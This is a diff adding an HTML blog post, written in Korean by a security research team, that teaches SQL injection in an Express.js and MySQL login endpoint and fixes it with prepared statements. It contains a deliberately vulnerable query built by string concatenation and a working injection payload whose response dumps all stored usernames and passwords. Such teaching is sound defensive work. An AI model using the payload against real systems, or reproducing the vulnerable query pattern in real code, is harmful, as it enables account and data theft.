@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
+  
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Express.js + MySQL SQLi | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="Express.js + MySQL SQLi" />
+<meta name="author" content="jeong.su" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Express.js + MySQL SQLi" />
+<meta property="og:description" content="Express.js + MySQL SQLi" />
+<link rel="canonical" href="http://202.182.127.225:4000/2020-10-01/Expressjs" />
+<meta property="og:url" content="http://202.182.127.225:4000/2020-10-01/Expressjs" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Express.js + MySQL SQLi","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","author":{"@type":"Person","name":"jeong.su"},"url":"http://202.182.127.225:4000/2020-10-01/Expressjs","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-10-01/Expressjs"},"description":"Express.js + MySQL SQLi","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+ 
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+   <h1 class="post-title">Express.js + MySQL SQLi</h1>
+   <div class="post-line"></div>
+
+   
+      
+         
+            <span class="tag"><center><i>Web</i></center></span>
+         
+      
+         
+            <span class="tag"><center><i>node.js</i></center></span>
+         
+      
+   
+   
+   <ul>
+  <li><a href="#expressjs--mysql-sqli">Express.js + MySQL SQLi</a></li>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#expressjs">Express.js</a>
+    <ul>
+      <li><a href="#install">Install</a></li>
+      <li><a href="#hello-world">Hello world</a></li>
+    </ul>
+  </li>
+  <li><a href="#mysql">MySQL</a>
+    <ul>
+      <li><a href="#install-1">Install</a></li>
+      <li><a href="#hello-world-1">Hello world</a></li>
+    </ul>
+  </li>
+  <li><a href="#expressjs--mysql">Express.js + MySQL</a>
+    <ul>
+      <li><a href="#login-example">Login Example</a></li>
+      <li><a href="#sqli-취약점">SQLi 취약점</a></li>
+      <li><a href="#sql-prepared-statement">SQL Prepared Statement</a></li>
+      <li><a href="#또-다시-sqli">또 다시 SQLi</a></li>
+      <li><a href="#대응-방안">대응 방안</a></li>
+    </ul>
+  </li>
+  <li><a href="#마무리">마무리</a></li>
+</ul>
+   
+   <h1 id="expressjs--mysql-sqli">Express.js + MySQL SQLi</h1>
+
+<blockquote>
+  <p>2020.09
+라온화이트햇 핵심연구팀 최정수
+jeon95u@gmail.com</p>
+</blockquote>
+
+<h1 id="summary">Summary</h1>
+
+<p>Node.js를 위한 웹 프레인워크인 Express.js에서 MySQL를 연동하여 사용할 때 발생 할 수 있는 SQL Injection 취약점에 대해서 설명하고 Prepared statement를 적용 했을때 발생 할 수 있는 경우에 대해서 설명합니다.</p>
+
+<h1 id="expressjs">Express.js</h1>
+
+<p>Express.js는 Node.js를 위한 빠르고 개방적인 간결한 웹 프레임워크입니다.</p>
+
+<p><a href="https://expressjs.com/">https://expressjs.com/</a></p>
+
+<blockquote>
+  <p>Fast, unopinionated, minimalist web framework for Node.js</p>
+</blockquote>
+
+<h2 id="install">Install</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>myapp
+<span class="nb">cd </span>myapp
+
+npm init
+
+npm <span class="nb">install </span>express <span class="nt">--save</span>
+</code></pre></div></div>
+
+<p>Express.js는 위와 같은 명령어를 사용해서 설치할 수 있습니다.</p>
+
+<h2 id="hello-world">Hello world</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// app.js
+const express <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span>
+const app <span class="o">=</span> express<span class="o">()</span>
+const port <span class="o">=</span> 3000
+
+app.get<span class="o">(</span><span class="s1">'/'</span>, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
+	res.send<span class="o">(</span><span class="s1">'Hello World!'</span><span class="o">)</span>
+<span class="o">})</span>
+
+app.listen<span class="o">(</span>port, <span class="o">()</span> <span class="o">=&gt;</span> <span class="o">{</span>
+	console.log<span class="o">(</span><span class="sb">`</span>Example app listening at http://localhost:<span class="k">${</span><span class="nv">port</span><span class="k">}</span><span class="sb">`</span><span class="o">)</span>
+<span class="o">})</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node app.js
+</code></pre></div></div>
+
+<p>Express.js는 위와 같이 간단한 코드로 웹 서비스 어플리케이션을 개발하고 실행할 수 있습니다.</p>
+
+<h1 id="mysql">MySQL</h1>
+
+<p>Node.js에서 MySQL을 사용하기 위해서 JavaScript Client 라이브러리를 사용한다.</p>
+
+<p><a href="https://github.com/mysqljs/mysql">https://github.com/mysqljs/mysql</a></p>
+
+<blockquote>
+  <p>A pure node.js JavaScript Client implementing the MySQL protocol.</p>
+</blockquote>
+
+<h2 id="install-1">Install</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm <span class="nb">install </span>mysql
+</code></pre></div></div>
+
+<p>mysql client 라이브러리는 위와 같은 명령어를 사용해서 설치할 수 있습니다.</p>
+
+<h2 id="hello-world-1">Hello world</h2>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// mysql_test.js</span>
+<span class="kd">var</span> <span class="nx">mysql</span>      <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
+  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">me</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">secret</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">my_db</span><span class="dl">'</span>
+<span class="p">});</span>
+
+<span class="nx">connection</span><span class="p">.</span><span class="nx">connect</span><span class="p">();</span>
+
+<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT 1 + 1 AS solution</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">The solution is: </span><span class="dl">'</span><span class="p">,</span> <span class="nx">results</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">solution</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">connection</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">node</span> <span class="nx">mysql_test</span><span class="p">.</span><span class="nx">js</span>
+</code></pre></div></div>
+
+<p>Node.js 기반의 MySQL JavaScript client는 위 예제와 같이 사용할 수 있습니다.</p>
+
+<h1 id="expressjs--mysql">Express.js + MySQL</h1>
+
+<h2 id="login-example">Login Example</h2>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// app.js</span>
+<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
+
+<span class="kd">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
+  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">root</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">autoset</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">test</span><span class="dl">'</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+		<span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">results</span><span class="p">);</span>
+	<span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Example app listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>Express.js + MySQL를 사용해서 login을 간단히 구현한 예제입니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Length: 14
+content-type: application/json
+
+{"id":"guest"}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 29
+Date: Tue, 29 Sep 2020 12:15:56 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"guest","pw":"guest"}]
+</code></pre></div></div>
+
+<p>정상적인 사용을 했을 때의 요청(Request)과 응답(Response)입니다.</p>
+
+<p><code class="highlighter-rouge">id</code>로 <code class="highlighter-rouge">guest</code>를 요청 했을 때 <code class="highlighter-rouge">guest</code> 계정의 <code class="highlighter-rouge">id</code>와 <code class="highlighter-rouge">pw</code>를 정상적으로 불러오는 것을 확인할 수 있습니다.</p>
+
+<h2 id="sqli-취약점">SQLi 취약점</h2>
+
+<p>여러분은 <code class="highlighter-rouge">Login Example</code>인 <code class="highlighter-rouge">app.js</code> 코드에서 취약한 부분을 발견 하셨나요?</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">connection.query</code>의 첫 번째 인자로 SQL Query가 넘어가는데 위와 같이 문자열을 그대로 이어 붙이기 때문에 SQLi 취약점이 발생하게 됩니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+content-type: application/json
+Content-Length: 19
+Pragma: no-cache
+
+{"id":"\" || 1-- "}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 160
+Date: Tue, 29 Sep 2020 12:22:35 GMT
+Connection: keep-alive
+Cache-Control: no-cache
+
+[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
+</code></pre></div></div>
+
+<p>SQLi 공격을 했을 때의 요청(Request)과 응답(Response)입니다.</p>
+
+<p><code class="highlighter-rouge">id</code>에 <code class="highlighter-rouge">" || 1--</code> 값이 들어갔기 때문에 최종적으로 <code class="highlighter-rouge">SELECT * FROM user WHERE id = "" || 1-- "</code></p>
+
+<p>쿼리문이 만들어졌고 모든 Row를 리턴하게 되었습니다.</p>
+
+<p><img src="/assets/202010/202010_soo.png" alt="/assets/202010/202010_soo.png" /></p>
+
+<center><b>MySQL Query Log</b></center>
+
+<p>MySQL Query Log를 통해서도 실제로 Injection에 성공한 것을 알 수 있습니다.</p>
+
+<h2 id="sql-prepared-statement">SQL Prepared Statement</h2>
+
+<p>위와 같은 SQLi 취약점을 방지하기 위해서 MySQL JavaScript Client에서 <code class="highlighter-rouge">Prepared Statement</code> 기능이 존재합니다. 쉽게 말해서 SQL 쿼리를 만들 때 인자를 알아서 escape 처리하여 SQLi 취약점이 발생하지 않도록 만들어 줍니다.</p>
+
+<p>그러면 위에서 다루었던 로그인 예제 코드에 Prepared Statement를 적용 해볼까요?</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// app.js</span>
+<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
+
+<span class="kd">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
+  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">root</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">autoset</span><span class="dl">'</span><span class="p">,</span>
+  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">test</span><span class="dl">'</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = ?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+		<span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">results</span><span class="p">);</span>
+	<span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Example app listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = ?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+</code></pre></div></div>
+
+<p>query문에 <code class="highlighter-rouge">?</code>를 사용했고 2번째 인자로 <code class="highlighter-rouge">req.body.id</code>를 넘겨 줌으로써 Prepared Statement를 적용했습니다. 위에 코드에서 아래 코드로 변경된 것을 확인할 수 있습니다.</p>
+
+<p>원리를 살펴보고자 조금 더 자세히 분석해보면 <code class="highlighter-rouge">Connection.js</code>에서 <code class="highlighter-rouge">sql</code>, <code class="highlighter-rouge">values</code>를 <code class="highlighter-rouge">format</code>함수에 넣어 줍니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// node_modules/mysql/lib/Connection.js</span>
+<span class="nx">Connection</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">Connection</span><span class="p">.</span><span class="nx">createQuery</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">cb</span><span class="p">);</span>
+  <span class="nx">query</span><span class="p">.</span><span class="nx">_connection</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">sql</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="dl">'</span><span class="s1">typeCast</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">sql</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">query</span><span class="p">.</span><span class="nx">typeCast</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">typeCast</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">sql</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">query</span><span class="p">.</span><span class="nx">sql</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">query</span><span class="p">.</span><span class="nx">values</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span> <span class="o">=</span> <span class="nx">wrapCallbackInDomain</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">this</span><span class="p">.</span><span class="nx">_implyConnect</span><span class="p">();</span>
+
+  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nx">_enqueue</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// node_modules/mysql/index.js</span>
+<span class="nx">exports</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">SqlString</span> <span class="o">=</span> <span class="nx">loadClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">SqlString</span><span class="dl">'</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">format</code> 함수는 <code class="highlighter-rouge">sqlstring</code>을 사용하는 것을 알 수 있습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">SqlString</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">values</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">sql</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">values</span> <span class="k">instanceof</span> <span class="nb">Array</span> <span class="o">||</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">values</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="nx">values</span> <span class="o">=</span> <span class="p">[</span><span class="nx">values</span><span class="p">];</span>
+  <span class="p">}</span>
+
+  <span class="kd">var</span> <span class="nx">chunkIndex</span>        <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">placeholdersRegex</span> <span class="o">=</span> <span class="sr">/</span><span class="se">\?</span><span class="sr">+/g</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">result</span>            <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">valuesIndex</span>       <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">match</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="nx">valuesIndex</span> <span class="o">&lt;</span> <span class="nx">values</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">match</span> <span class="o">=</span> <span class="nx">placeholdersRegex</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">sql</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">match</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">continue</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">len</span> <span class="o">===</span> <span class="mi">2</span>
+      <span class="p">?</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">escapeId</span><span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="nx">valuesIndex</span><span class="p">])</span>
+      <span class="p">:</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">escape</span><span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="nx">valuesIndex</span><span class="p">],</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">);</span>
+
+    <span class="nx">result</span> <span class="o">+=</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">chunkIndex</span><span class="p">,</span> <span class="nx">match</span><span class="p">.</span><span class="nx">index</span><span class="p">)</span> <span class="o">+</span> <span class="nx">value</span><span class="p">;</span>
+    <span class="nx">chunkIndex</span> <span class="o">=</span> <span class="nx">placeholdersRegex</span><span class="p">.</span><span class="nx">lastIndex</span><span class="p">;</span>
+    <span class="nx">valuesIndex</span><span class="o">++</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">chunkIndex</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Nothing was replaced</span>
+    <span class="k">return</span> <span class="nx">sql</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">chunkIndex</span> <span class="o">&lt;</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">result</span> <span class="o">+</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">chunkIndex</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SqlString.format</code> 함수는 내부에서 <code class="highlighter-rouge">escape</code> 함수를 통해 SQL문을 escape 해주는 것을 알 수 있습니다.</p>
+
+<p>이제 원리를 알았으니 그러면 위에서 SQLi 공격을 하는 똑같은 요청을 보냈을 때 어떻게 될까요?</p>
+
+<p>예상 하신대로 <code class="highlighter-rouge">실패!</code> 입니다.</p>
+
+<p>어떤 일이 벌어졌는지 MySQL Query Log를 살펴볼까요?</p>
+
+<p><img src="/assets/202010/202010_soo1.png" alt="/assets/202010/202010_soo1.png" /></p>
+
+<center><b>MySQL Query Log</b></center>
+
+<p>같은 요청을 보냈지만 <code class="highlighter-rouge">"</code>가 escape 처리 되면서 Query가 아닌 문자열로 취급되기 때문에 Injection이 발생하지 않았습니다.</p>
+
